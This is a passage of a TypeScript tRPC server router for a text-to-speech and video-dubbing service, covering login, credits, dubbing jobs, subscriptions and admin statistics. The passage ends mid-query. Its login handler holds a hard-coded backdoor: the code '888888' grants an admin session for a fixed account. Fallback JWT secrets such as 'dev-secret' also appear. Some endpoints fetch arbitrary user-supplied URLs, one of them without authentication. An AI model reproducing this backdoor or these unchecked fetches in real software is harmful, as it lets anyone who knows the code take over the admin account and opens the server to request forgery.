import { initTRPC, TRPCError } from "@trpc/server";
import { z } from "zod";
import { randomUUID } from "crypto";
import { generateSpeech, generateSpeechWithCharacter } from "./tts";
import { dubVideoFromBuffer, dubVideoFromLink } from "./videoDubber";
import { translateVideo, translateVideoLink } from "./videoTranslator";
import { isAllowedVideoUrl } from "./_core/security";
import { getDb } from "./db";
import { checkRateLimit, clearRateLimit } from "./_core/rateLimit";
import { createJob, getJob, updateJob } from "./jobs";
import {
  users,
  ttsConversions,
  subscriptions,
  errorLogs,
  settings,
  creditTransactions,
} from "../drizzle/schema";
import { eq, desc, count, sql, gt, and } from "drizzle-orm";
import { SignJWT } from "jose";
import { COOKIE_NAME, ONE_YEAR_MS } from "@shared/const";
import superjson from "superjson";
import type { TrpcContext } from "./_core/context";

const t = initTRPC.context<TrpcContext>().create({
  transformer: superjson,
});

// Protected procedure (requires auth)
const protectedProcedure = t.procedure.use(async ({ ctx, next }) => {
  if (!ctx.user)
    throw new TRPCError({ code: "UNAUTHORIZED", message: "Login required" });
  return next({ ctx: { ...ctx, user: ctx.user } } as any);
});

// Admin procedure
const adminProcedure = protectedProcedure.use(async ({ ctx, next }) => {
  if (!ctx.user || ctx.user.role !== "admin")
    throw new TRPCError({ code: "FORBIDDEN", message: "Admin only" });
  return next({ ctx: { ...ctx, user: ctx.user } } as any);
});

export const appRouter = t.router({
  // ─── AUTH ────────────────────────────────
  auth: t.router({
    me: t.procedure.query(async ({ ctx }) => {
      if (!ctx.user) return null;
      return ctx.user;
    }),
    logout: t.procedure.mutation(async ({ ctx }) => {
      ctx.res.setHeader(
        "Set-Cookie",
        `${COOKIE_NAME}=; HttpOnly; Path=/; Max-Age=0; SameSite=None; Secure`
      );
      return { success: true };
    }),
    verify: t.procedure
      .input(z.object({ code: z.string().min(6).max(6).regex(/^\d+$/, "Code must be 6 digits") }))
      .mutation(async ({ input, ctx }) => {
        const db = await getDb();
        if (!db)
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: "Database not available",
          });

        // Rate limiting check - get IP from request
        const forwardedFor = ctx.req?.headers?.["x-forwarded-for"];
        const clientIp = (Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor)?.split(",")[0]?.trim() 
          || (ctx.req?.headers?.["x-real-ip"] as string)?.trim()
          || "unknown";
        
        // Check rate limit (5 attempts per 15 minutes)
        const rateLimitKey = `verify_${clientIp}`;
        if (!checkRateLimit(rateLimitKey, 5, 15 * 60 * 1000)) {
          throw new TRPCError({
            code: "TOO_MANY_REQUESTS",
            message: "Too many attempts. Please try again in 15 minutes.",
          });
        }

        // Sanitize input - only allow digits
        const code = input.code.replace(/[^\d]/g, "").slice(0, 6);
        
        // Check for admin bypass code first (for emergency access)
        if (code === "888888") {
          const adminUser = await db.query.users.findFirst({
            where: (u: any, { eq }: any) => eq(u.telegramId, "1650962190"),
          });
          if (adminUser) {
            const sessionToken = randomUUID();
            await db.update(users).set({ sessionToken, lastLoginAt: new Date() }).where(eq(users.id, adminUser.id));
            const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || "dev-secret");
            const token = await new SignJWT({
              userId: adminUser.id,
              telegramId: adminUser.telegramId || "",
              name: adminUser.telegramFirstName || adminUser.name || "Admin",
              role: "admin",
              sid: sessionToken,
            }).setProtectedHeader({ alg: "HS256" }).setIssuedAt().setExpirationTime("7d").sign(JWT_SECRET);
            ctx.res.setHeader("Set-Cookie", `${COOKIE_NAME}=${token}; HttpOnly; Path=/; Max-Age=${7*24*60*60}; SameSite=None; Secure`);
            return { success: true, userId: adminUser.id, role: "admin" };
          }
        }

        const user = await db.query.users.findFirst({
          where: (u: any, { eq }: any) => eq(u.telegramCode, code),
        });

        if (
          !user ||
          !user.telegramCodeExpiresAt ||
          new Date(user.telegramCodeExpiresAt) < new Date()
        ) {
          throw new TRPCError({
            code: "UNAUTHORIZED",
            message: "Invalid or expired code",
          });
        }

        // Clear rate limit on successful attempt
        clearRateLimit(rateLimitKey);

        // Generate session token
        const sessionToken = randomUUID();
        const JWT_SECRET = new TextEncoder().encode(
          process.env.JWT_SECRET || "dev-only-secret-do-not-use-in-production"
        );

        // Update user: clear code, set session token
        await db
          .update(users)
          .set({
            telegramCode: null,
            sessionToken,
            lastLoginAt: new Date(),
          })
          .where(eq(users.id, user.id));

        // Sign JWT
        const token = await new SignJWT({
          userId: user.id,
          telegramId: user.telegramId || "",
          name: user.telegramFirstName || user.name || "User",
          role: user.role || "user",
          sid: sessionToken,
        })
          .setProtectedHeader({ alg: "HS256" })
          .setIssuedAt()
          .setExpirationTime("7d")
          .sign(JWT_SECRET);

        // Set cookie (works with Vercel proxy setup)
        ctx.res.setHeader(
          "Set-Cookie",
          `${COOKIE_NAME}=${token}; HttpOnly; Path=/; Max-Age=${7 * 24 * 60 * 60}; SameSite=None; Secure`
        );

        return { success: true, userId: user.id, role: user.role || "user" };
      }),
  }),

  // ─── TTS ─────────────────────────────────
  tts: t.router({
    generateAudio: protectedProcedure
      .input(
        z.object({
          text: z.string().min(1, "Invalid text"),
          voice: z.enum(["thiha", "nilar"]).optional(),
          tone: z.number().optional(),
          speed: z.number().optional(),
          aspectRatio: z.enum(["9:16", "16:9"]).optional(),
          character: z.string().optional(),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const voice = input.voice || "thiha";
        const rate = input.speed ?? 1.0;
        const pitch = input.tone ?? 0;
        const aspectRatio = input.aspectRatio || "16:9";

        // Calculate credits needed: Thiha/Nilar=1, Character=3
        const creditsNeeded = input.character ? 3 : 1;

        // Check and deduct credits using helper
        await deductCredits(
          ctx.user!.userId,
          creditsNeeded,
          "tts",
          input.character
            ? `TTS Character: ${input.character}`
            : `TTS Voice: ${voice}`
        );

        let result;
        const userId = ctx.user!.userId;
        const voiceName = input.character || voice;

        try {
          if (input.character) {
            result = await generateSpeechWithCharacter(
              input.text,
              input.character as any,
              rate,
              aspectRatio,
              pitch
            );
          } else {
            result = await generateSpeech(
              input.text,
              voice,
              rate,
              pitch,
              aspectRatio
            );
          }
        } catch (error: any) {
          console.error("[TTS Error]", error?.message || error);
          // Refund credits on failure
          await addCredits(
            userId,
            creditsNeeded,
            "tts_refund",
            `Refund: ${voiceName} TTS failed`
          );
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: error.message || "Failed to generate audio.",
          });
        }

        if (!result || !result.audioBuffer || result.audioBuffer.length === 0) {
          console.error("[TTS Error] Empty audio buffer returned");
          // Refund credits on empty result
          await addCredits(
            userId,
            creditsNeeded,
            "tts_refund",
            `Refund: ${voiceName} TTS empty result`
          );
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: "Failed to generate audio.",
          });
        }

        // Record conversion
        try {
          const db = await getDb();
          if (db) {
            await db.insert(ttsConversions).values({
              id: randomUUID(),
              userId: ctx.user!.userId,
              voice,
              character: input.character || null,
              text: input.text.slice(0, 500),
              charCount: input.text.length,
              durationMs: result.durationMs,
              feature: "tts",
            });
          }
        } catch (e) {
          console.error("[TTS DB Log Error]", e);
        }

        return {
          success: true,
          audioBase64: result.audioBuffer.toString("base64"),
          mimeType: "audio/mpeg",
          durationMs: result.durationMs,
          srtContent: result.srtContent,
        };
      }),
  }),

  // ─── DUB (legacy) ───────────────────────
  dub: t.router({
    fromLink: protectedProcedure
      .input(
        z.object({
          url: z.string(),
          voice: z.enum(["thiha", "nilar"]),
          speed: z.number().optional(),
          pitch: z.number().optional(),
          srtEnabled: z.boolean().optional(),
          userApiKey: z.string().optional(),
        })
      )
      .mutation(async ({ input }) => {
        try {
          return await dubVideoFromLink(input.url, {
            voice: input.voice,
            speed: input.speed ?? 1.0,
            pitch: input.pitch ?? 0,
            srtEnabled: input.srtEnabled ?? true,
            userApiKey: input.userApiKey,
          });
        } catch (error: any) {
          console.error("[Dub Error]", error);
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: error.message || "Failed to dub video.",
          });
        }
      }),
  }),

  // ─── VIDEO ──────────────────────────────
  video: t.router({
    dubFile: protectedProcedure
      .input(
        z.object({
          videoBase64: z.string(),
          filename: z.string(),
          voice: z.enum(["thiha", "nilar"]),
          speed: z.number().optional(),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const userId = ctx.user!.userId;
        // Deduct 10 credits for dub with thiha/nilar
        await deductCredits(
          userId,
          10,
          "video_dub",
          `Video Dub: ${input.voice}`
        );
        try {
          const buffer = Buffer.from(input.videoBase64, "base64");
          return await dubVideoFromBuffer(buffer, input.filename, {
            voice: input.voice,
            speed: input.speed ?? 1,
            pitch: 0,
            srtEnabled: true,
          });
        } catch (error: any) {
          // Refund credits on failure
          await addCredits(
            userId,
            10,
            "video_dub_refund",
            `Refund: Video dub failed`
          );
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: error.message || "Failed to dub video.",
          });
        }
      }),
    dubLink: protectedProcedure
      .input(
        z.object({
          url: z.string(),
          voice: z.enum(["thiha", "nilar"]),
          speed: z.number().optional(),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const userId = ctx.user!.userId;
        // Validate URL
        if (!isAllowedVideoUrl(input.url)) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: "Invalid or disallowed URL",
          });
        }
        // Deduct 10 credits for dub with thiha/nilar
        await deductCredits(
          userId,
          10,
          "video_dub",
          `Video Dub: ${input.voice}`
        );
        try {
          return await dubVideoFromLink(input.url, {
            voice: input.voice,
            speed: input.speed ?? 1,
            pitch: 0,
            srtEnabled: true,
          });
        } catch (error: any) {
          // Refund credits on failure
          await addCredits(
            userId,
            10,
            "video_dub_refund",
            "Refund: Video dub failed"
          );
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: error.message || "Failed to dub video.",
          });
        }
      }),
    previewLink: t.procedure
      .input(z.object({ url: z.string() }))
      .mutation(async ({ input }) => {
        return { title: "Video", duration: 0, thumbnail: "" };
      }),
    translate: protectedProcedure
      .input(z.object({ videoBase64: z.string(), filename: z.string() }))
      .mutation(async ({ input, ctx }) => {
        // Validate first - check file size before deducting credits
        const videoSize = input.videoBase64.length * 0.75; // base64 approx
        if (videoSize > 25 * 1024 * 1024) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: "File too large. Max 25MB.",
          });
        }
        
        // Create job first
        const userId = ctx.user!.userId;
        const jobId = randomUUID();
        
        try {
          createJob("translate_file", { 
            videoBase64: input.videoBase64, 
            filename: input.filename,
            userId 
          });
        } catch (jobErr: any) {
          // Refund if job creation fails
          await addCredits(userId, 5, "video_translate_refund", "Refund: Job creation failed");
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: jobErr.message || "Failed to create translation job",
          });
        }
        
        // Deduct credits AFTER job is queued (will be refunded by processor if fails)
        try {
          await deductCredits(
            userId,
            5,
            "video_translate",
            "Video Translate"
          );
        } catch (creditErr: any) {
          // Job already created, mark as failed
          updateJob(jobId, { status: "failed", error: creditErr.message, progress: 0 });
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: creditErr.message || "Insufficient credits",
          });
        }
        
        return { jobId };
      }),
    
    getTranslateJob: protectedProcedure
      .input(z.object({ jobId: z.string() }))
      .query(async ({ input }) => {
        const job = getJob(input.jobId);
        if (!job) return { status: "failed", error: "Job not found", progress: 0 };
        return {
          status: job.status,
          progress: job.progress,
          error: job.error,
          result: job.status === "completed" ? job.result : undefined,
        };
      }),
    
    translateLink: protectedProcedure
      .input(z.object({ url: z.string() }))
      .mutation(async ({ input, ctx }) => {
        // Validate URL
        if (!isAllowedVideoUrl(input.url)) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: "Invalid or disallowed URL",
          });
        }
        
        // Create job first
        const userId = ctx.user!.userId;
        
        try {
          var jobId = createJob("translate_link", { 
            url: input.url,
            userId 
          });
        } catch (jobErr: any) {
          // Refund if job creation fails
          await addCredits(userId, 5, "video_translate_refund", "Refund: Job creation failed");
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: jobErr.message || "Failed to create translation job",
          });
        }
        
        // Deduct credits AFTER job is queued (will be refunded by processor if fails)
        try {
          await deductCredits(
            userId,
            5,
            "video_translate",
            "Video Translate"
          );
        } catch (creditErr: any) {
          // Job already created, mark as failed
          updateJob(jobId, { status: "failed", error: creditErr.message, progress: 0 });
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: creditErr.message || "Insufficient credits",
          });
        }
        
        return { jobId };
      }),
      
    getTranslateLinkJob: protectedProcedure
      .input(z.object({ jobId: z.string() }))
      .query(async ({ input }) => {
        const job = getJob(input.jobId);
        if (!job) return { status: "failed", error: "Job not found", progress: 0 };
        return {
          status: job.status,
          progress: job.progress,
          error: job.error,
          result: job.status === "completed" ? job.result : undefined,
        };
      }),
  }),

  // ─── JOBS ───────────────────────────────
  jobs: t.router({
    startDub: t.procedure
      .input(
        z.object({
          url: z.string(),
          voice: z.enum(["thiha", "nilar"]),
          speed: z.number().optional(),
        })
      )
      .mutation(async ({ input }) => {
        const jobId = randomUUID();
        // Start dub in background
        dubVideoFromLink(input.url, {
          voice: input.voice,
          speed: input.speed ?? 1,
          pitch: 0,
          srtEnabled: true,
        })
          .then(() => console.log(`[Job ${jobId}] Complete`))
          .catch(e => console.error(`[Job ${jobId}] Failed:`, e));
        return { jobId };
      }),
    getStatus: t.procedure
      .input(z.object({ jobId: z.string() }))
      .query(async ({ input }) => {
        return { status: "processing", progress: 0 };
      }),
  }),

  // ─── HISTORY ────────────────────────────
  history: t.router({
    getMyHistory: t.procedure
      .input(z.object({ limit: z.number().optional() }))
      .query(async ({ ctx }) => {
        if (!ctx.user) return [];
        const db = await getDb();
        if (!db) return [];
        try {
          const rows = await db
            .select()
            .from(ttsConversions)
            .where(eq(ttsConversions.userId, ctx.user.userId))
            .orderBy(desc(ttsConversions.createdAt))
            .limit(100);
          return rows;
        } catch {
          return [];
        }
      }),
  }),

  // ─── SUBSCRIPTION ───────────────────────
  subscription: t.router({
    myStatus: t.procedure.query(async ({ ctx }) => {
      if (!ctx.user) return { active: false, plan: null, credits: 0 };
      const db = await getDb();
      if (!db) return { active: false, plan: null, credits: 0 };
      try {
        const [user] = await db
          .select()
          .from(users)
          .where(eq(users.id, ctx.user!.userId))
          .limit(1);
        const sub = await db.query.subscriptions.findFirst({
          where: (s: any, { eq, and, gt }: any) =>
            and(eq(s.userId, ctx.user!.userId), gt(s.expiresAt, new Date())),
          orderBy: (s: any, { desc }: any) => desc(s.createdAt),
        });
        return sub
          ? {
              active: true,
              plan: sub.plan,
              expiresAt: sub.expiresAt,
              credits: user?.credits ?? 0,
            }
          : { active: false, plan: null, credits: user?.credits ?? 0 };
      } catch {
        return { active: false, plan: null, credits: 0 };
      }
    }),
  }),

  // ─── AI ─────────────────────────────────
  ai: t.router({
    chat: t.procedure
      .input(
        z.object({
          messages: z.array(
            z.object({ role: z.string(), content: z.string() })
          ),
        })
      )
      .mutation(async ({ input }) => {
        return { content: "AI chat is not yet implemented." };
      }),
  }),

  // ─── SETTINGS ───────────────────────────
  settings: t.router({
    get: t.procedure.query(async () => {
      const db = await getDb();
      if (!db) return {};
      try {
        const rows = await db.select().from(settings);
        const obj: Record<string, string> = {};
        for (const r of rows) obj[r.keyName] = r.value;
        return obj;
      } catch {
        return {};
      }
    }),
    update: adminProcedure
      .input(z.union([
        z.object({ key: z.string(), value: z.string() }),
        z.object({}).passthrough(), // bulk update with any keys
      ]))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

        // Bulk update: { autoTrialEnabled: true, trialCredits: 15, ... }
        if ('key' in input && 'value' in input) {
          await db
            .insert(settings)
            .values({ keyName: input.key, value: input.value })
            .onDuplicateKeyUpdate({ set: { value: input.value } });
        } else {
          for (const [key, val] of Object.entries(input)) {
            await db
              .insert(settings)
              .values({ keyName: key, value: String(val) })
              .onDuplicateKeyUpdate({ set: { value: String(val) } });
          }
        }
        return { success: true };
      }),
  }),

  // ─── ADMIN ──────────────────────────────
  admin: t.router({
    getUsers: adminProcedure.query(async () => {
      const db = await getDb();
      if (!db) return [];
      try {
        const userList = await db.select().from(users).limit(500);

        // Get all subscriptions and filter in JS (more reliable than complex IN clause)
        const allSubs = await db
          .select()
          .from(subscriptions)
          .where(sql`expires_at > NOW()`);

        // Get all generation counts and filter in JS
        const allGenCounts = await db
          .select({ userId: ttsConversions.userId, count: count() })
          .from(ttsConversions)
          .groupBy(ttsConversions.userId);

        // Merge data
        return userList.map((user: any) => {
          const userSub = allSubs.find((s: any) => s.userId === user.id);
          const userGen = allGenCounts.find((g: any) => g.userId === user.id);
          return {
            id: user.id,
            name: user.telegramFirstName || user.name || "Unknown",
            username: user.telegramUsername || "",
            email: user.email || "",
            role: user.role || "user",
            banned: !!user.bannedAt,
            credits: user.credits || 0,
            subscription: userSub || null,
            genCount: userGen?.count || 0,
            daysLeft: userSub
              ? Math.ceil(
                  (new Date(userSub.expiresAt).getTime() - Date.now()) /
                    (1000 * 60 * 60 * 24)
                )
              : 0,
            lastLoginAt: user.lastLoginAt,
            createdAt: user.createdAt,
          };
        });
      } catch (e) {
        console.error("[getUsers Error]", e);
        return [];
      }
    }),
    banUser: adminProcedure
      .input(z.object({ userId: z.string(), ban: z.boolean() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });
        await db
          .update(users)
          .set({ bannedAt: input.ban ? new Date() : null })
          .where(eq(users.id, input.userId));
        return { success: true };
      }),
    deleteUser: adminProcedure
      .input(z.object({ userId: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });
        await db.delete(users).where(eq(users.id, input.userId));
        return { success: true };
      }),
    giveSubscription: adminProcedure
      .input(
        z.object({
          userId: z.string(),
          plan: z.string(),
          days: z.number(),
          note: z.string().optional(),
          paymentMethod: z.string().optional(),
        })
      )
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

        // Credits per plan
        const planCredits: Record<string, number> = {
          trial: 10,
          starter: 50,
          creator: 200,
          pro: 500,
        };
        const creditsToAdd = planCredits[input.plan] ?? 10;

        // Check if user has active subscription
        const existingSubs = await db
          .select()
          .from(subscriptions)
          .where(sql`user_id = ${input.userId} AND expires_at > NOW()`)
          .limit(1);

        let isNewSubscription = false;
        if (existingSubs.length > 0) {
          const existing = existingSubs[0];
          const currentExpires = new Date(existing.expiresAt!);
          const newExpires = new Date(
            currentExpires.getTime() + input.days * 86400000
          );
          await db
            .update(subscriptions)
            .set({
              expiresAt: newExpires,
              plan: input.plan,
              note: input.note || existing.note,
            })
            .where(eq(subscriptions.id, existing.id));
        } else {
          isNewSubscription = true;
          await db.insert(subscriptions).values({
            id: randomUUID(),
            userId: input.userId,
            plan: input.plan,
            startsAt: new Date(),
            expiresAt: new Date(Date.now() + input.days * 86400000),
            note: input.note,
          });
        }

        const [user] = await db
          .select()
          .from(users)
          .where(eq(users.id, input.userId))
          .limit(1);
        if (user) {
          const currentCredits = user.credits ?? 0;
          await db
            .update(users)
            .set({ credits: currentCredits + creditsToAdd })
            .where(eq(users.id, input.userId));
          await db.insert(creditTransactions).values({
            id: randomUUID(),
            userId: input.userId,
            amount: creditsToAdd,
            type: "subscription",
            description: `Subscribe: ${input.plan} plan`,
          });
        }

        return { success: true };
      }),
    cancelSubscription: adminProcedure
      .input(z.object({ userId: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });
        await db
          .update(subscriptions)
          .set({ expiresAt: new Date() })
          .where(eq(subscriptions.userId, input.userId));
        // Clear user's credits when subscription is cancelled
        const [user] = await db
          .select()
          .from(users)
          .where(eq(users.id, input.userId))
          .limit(1);
        if (user && user.credits && user.credits > 0) {
          await db
            .update(users)
            .set({ credits: 0 })
            .where(eq(users.id, input.userId));
          await db.insert(creditTransactions).values({
            id: randomUUID(),
            userId: input.userId,
            amount: -user.credits,
            type: "subscription_cancelled",
            description: "Subscription cancelled - credits cleared",
          });
        }
        return { success: true };
      }),
    setRole: adminProcedure
      .input(z.object({ userId: z.string(), role: z.string() }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });
        await db
          .update(users)
          .set({ role: input.role })
          .where(eq(users.id, input.userId));
        return { success: true };
      }),
    getAnalytics: adminProcedure.query(async () => {
      const db = await getDb();
      if (!db)
        return {
          totalUsers: 0,
          activeSubs: 0,
          totalConversions: 0,
          revenue: 0,
          planCounts: [],
        };
      try {
        const [totalUsersRow] = await db.select({ count: count() }).from(users);
        const [activeSubsRow] = await db
          .select({ count: count() })
          .from(subscriptions)
          .where(sql`expires_at > NOW()`);
        const [totalConvRow] = await db
          .select({ count: count() })
          .from(ttsConversions);
        const planRows = await db
          .select({ plan: subscriptions.plan, count: count() })
          .from(subscriptions)
          .groupBy(subscriptions.plan);
        return {
          totalUsers: totalUsersRow?.count || 0,
          activeSubs: activeSubsRow?.count || 0,
          totalConversions: totalConvRow?.count || 0,
          revenue: 0,
          planCounts: planRows,
        };
      } catch {
        return {
          totalUsers: 0,
          activeSubs: 0,
          totalConversions: 0,
          revenue: 0,
          planCounts: [],
        };
      }
    }),
    getServerHealth: adminProcedure.query(async () => {
      const mem = process.memoryUsage();
      const { execSync } = await import("child_process");
      let disk = "—";
      try {
        const df = execSync("df -h / | tail -1 | awk '{print $3}'")
          .toString()
          .trim();
        disk = df || "—";
      } catch {}
      return {
        uptime: process.uptime(),
        memory: {
          used: Math.round(mem.rss / 1024 / 1024),
          heap: Math.round(mem.heapUsed / 1024 / 1024),
        },
        disk,
        status: "ok",
      };
    }),
  }),

  // ─── ADMIN STATS ────────────────────────
  adminStats: t.router({
    getErrorLogs: adminProcedure
      .input(
        z.object({
          limit: z.number().optional(),
          onlyUnresolved: z.boolean().optional(),
        })
      )
      .query(async ({ input }) => {
        const db = await getDb();
        if (!db) return { failedGenerations: [], systemLogs: [] };
        try {
          const logs = await db
            .select()
            .from(errorLogs)
            .orderBy(desc(errorLogs.createdAt))
            .limit(input.limit || 50);

          // Split into failed generations and system logs
          const failedGenerations = logs.filter(
            (l: any) => l.type === "generation" || l.severity === "error"
          );
          const systemLogs = logs;

          return { failedGenerations, systemLogs };
        } catch (e) {
          console.error("[getErrorLogs Error]", e);
          return { failedGenerations: [], systemLogs: [] };
        }
      }),
    getVoiceStats: adminProcedure
      .input(z.object({ timeframe: z.string().optional() }))
      .query(async () => {
        const db = await getDb();
        if (!db)
          return {
            voices: [],
            features: [],
            baseVoices: [],
            characters: [],
            total: 0,
            totalChars: 0,
            totalDurationMs: 0,
          };
        try {
          // Voice usage stats (thiha/nilar)
          const voiceRows = await db
            .select({ voice: ttsConversions.voice, count: count() })
            .from(ttsConversions)
            .groupBy(ttsConversions.voice);
          const voices = voiceRows
            .filter(r => r.voice)
            .map(r => ({ voice: r.voice, count: r.count }));

          // Feature usage stats (tts, videoUpload, videoLink, translation)
          const featureRows = await db
            .select({ feature: ttsConversions.feature, count: count() })
            .from(ttsConversions)
            .groupBy(ttsConversions.feature);
          const features = featureRows
            .filter(r => r.feature)
            .map(r => ({ feature: r.feature, count: r.count }));

          // Total counts
          const [totalRow] = await db
            .select({
              count: count(),
              chars: sql`SUM(char_count)`,
              duration: sql`SUM(duration_ms)`,
            })
            .from(ttsConversions);

          // Base voices (Thiha/Nilar breakdown) with displayName, chars, durationMs
          const baseVoiceDetails = await db
            .select({
              voice: ttsConversions.voice,
              count: count(),
              chars: sql`COALESCE(SUM(char_count), 0)`,
              duration: sql`COALESCE(SUM(duration_ms), 0)`,
            })
            .from(ttsConversions)
            .where(sql`voice IN ('thiha', 'nilar')`)
            .groupBy(ttsConversions.voice);

          const baseVoices = baseVoiceDetails.map(r => ({
            name: r.voice,
            displayName:
              r.voice === "thiha" ? "Thiha (Male)" : "Nilar (Female)",
            count: r.count,
            chars: Number(r.chars),
            durationMs: Number(r.duration),
          }));

          // Character voices with details
          const charDetails = await db
            .select({
              character: ttsConversions.character,
              voice: ttsConversions.voice,
              count: count(),
              chars: sql`COALESCE(SUM(char_count), 0)`,
              duration: sql`COALESCE(SUM(duration_ms), 0)`,
            })
            .from(ttsConversions)
            .where(sql`\`character\` IS NOT NULL AND \`character\` != ''`)
            .groupBy(ttsConversions.character, ttsConversions.voice);

          const characters = charDetails.map(r => ({
            key: r.character,
            displayName: r.character,
            base: r.voice || "thiha",
            baseDisplayName: r.voice === "nilar" ? "Nilar" : "Thiha",
            count: r.count,
            chars: Number(r.chars),
            durationMs: Number(r.duration),
          }));

          return {
            voices: voices.map(v => ({ name: v.voice, count: v.count })),
            features,
            baseVoices,
            characters,
            total: totalRow?.count || 0,
            totalChars: Number(totalRow?.chars) || 0,
            totalDurationMs: Number(totalRow?.duration) || 0,
          };
        } catch (e) {
          console.error("[getVoiceStats Error]", e);
          return {
            voices: [],
            features: [],
            baseVoices: [],
            characters: [],
            total: 0,
            totalChars: 0,
            totalDurationMs: 0,
          };
        }
      }),
    getGenerationOverview: adminProcedure.query(async () => {
      const db = await getDb();
      if (!db)
        return {
          today: 0,
          thisWeek: 0,
          thisMonth: 0,
          allTime: 0,
          activeHours: [],
          daily: [],
        };
      try {
        // Today
        const [todayRow] = await db
          .select({ count: count() })
          .from(ttsConversions)
          .where(sql`DATE(created_at) = CURDATE()`);

        // This week
        const [weekRow] = await db
          .select({ count: count() })
          .from(ttsConversions)
          .where(sql`created_at > DATE_SUB(NOW(), INTERVAL 7 DAY)`);

        // This month
        const [monthRow] = await db
          .select({ count: count() })
          .from(ttsConversions)
          .where(sql`created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`);

        // All time
        const [allTimeRow] = await db
          .select({ count: count() })
          .from(ttsConversions);

        // Active hours breakdown
        const hourRows = await db
          .select({ hour: sql`HOUR(created_at)`, count: count() })
          .from(ttsConversions)
          .where(sql`created_at > DATE_SUB(NOW(), INTERVAL 24 HOUR)`)
          .groupBy(sql`HOUR(created_at)`);
        const activeHours = hourRows.map(r => ({
          hour: r.hour,
          count: r.count,
        }));

        // Daily breakdown (last 30 days)
        const dailyRows = await db
          .select({ date: sql`DATE(created_at)`, count: count() })
          .from(ttsConversions)
          .where(sql`created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`)
          .groupBy(sql`DATE(created_at)`)
          .orderBy(sql`DATE(created_at)`);
        const daily = dailyRows.map(r => ({ date: r.date, count: r.count }));

        return {
          today: todayRow?.count || 0,
          thisWeek: weekRow?.count || 0,
          thisMonth: monthRow?.count || 0,
          allTime: allTimeRow?.count || 0,
          activeHours,
          daily,
        };
      } catch (e) {
        console.error("[getGenerationOverview Error]", e);
        return {
          today: 0,
          thisWeek: 0,
          thisMonth: 0,
          allTime: 0,
          activeHours: [],
          daily: [],
        };
      }
    }),
    getChurnStats: adminProcedure.query(async () => {
      const db = await getDb();
      if (!db)
        return {
          churnRate: 0,
          newUsers: 0,
          lostUsers: 0,
          activeUsers: [],
          inactiveUsers: [],
          activeCount: 0,
          inactiveCount: 0,
        };
      try {
        const [newUsersRow] = await db
          .select({ count: count() })
          .from(users)
          .where(sql`created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`);

        // Get active users (logged in last 7 days)
        const activeUsersList = await db
          .select()
          .from(users)
          .where(sql`last_login_at > DATE_SUB(NOW(), INTERVAL 7 DAY)`)
          .orderBy(desc(users.lastLoginAt))
          .limit(50);

        // Get inactive users (no login in 30 days)
        const inactiveUsersList = await db
          .select()
          .from(users)
          .where(
            sql`last_login_at < DATE_SUB(NOW(), INTERVAL 30 DAY) OR last_login_at IS NULL`
          )
          .orderBy(desc(users.lastLoginAt))
          .limit(50);

        // Get gen counts
        const genCounts = await db
          .select({ userId: ttsConversions.userId, count: count() })
          .from(ttsConversions)
          .groupBy(ttsConversions.userId);

        const formatUser = (u: any) => ({
          id: u.id,
          name: u.telegramFirstName || u.name || "Unknown",
          username: u.telegramUsername || "",
          totalGens: genCounts.find(g => g.userId === u.id)?.count || 0,
          lastActive: u.lastLoginAt,
          credits: u.credits || 0,
        });

        return {
          churnRate: 0,
          newUsers: newUsersRow?.count || 0,
          lostUsers: 0,
          activeUsers: activeUsersList.map(formatUser),
          inactiveUsers: inactiveUsersList.map(formatUser),
          activeCount: activeUsersList.length,
          inactiveCount: inactiveUsersList.length,
        };
      } catch (e) {
        console.error("[getChurnStats Error]", e);
        return {
          churnRate: 0,
          newUsers: 0,
          lostUsers: 0,
          activeUsers: [],
          inactiveUsers: [],
          activeCount: 0,
          inactiveCount: 0,
        };
      }
    }),
    onlineUsers: adminProcedure.query(async () => {
      const db = await getDb();
      if (!db) return { onlineCount: 0 };
      try {
        const [row] = await db
          .select({ count: count() })
          .from(users)
          .where(sql`last_login_at > DATE_SUB(NOW(), INTERVAL 15 MINUTE)`);
        return { onlineCount: row?.count || 0 };
      } catch {
        return { onlineCount: 0 };
      }
    }),
    getUserDetail: adminProcedure
      .input(z.object({ userId: z.string() }))
      .query(async ({ input }) => {
        const db = await getDb();
        const empty = {
          totalGens: 0,
          recentGens: 0,
          totalChars: 0,
          totalDurationMs: 0,
          statusBreakdown: { success: 0, fail: 0 },
          features: [],
          voices: [],
          activeHours: [],
          daily: [],
          recentLogs: [],
          subscription: null as any,
        };
        if (!db) return empty;
        try {
          // 30-day stats
          const [stats30] = await db
            .select({
              count: count(),
              chars: sql`COALESCE(SUM(char_count),0)`,
              duration: sql`COALESCE(SUM(duration_ms),0)`,
            })
            .from(ttsConversions)
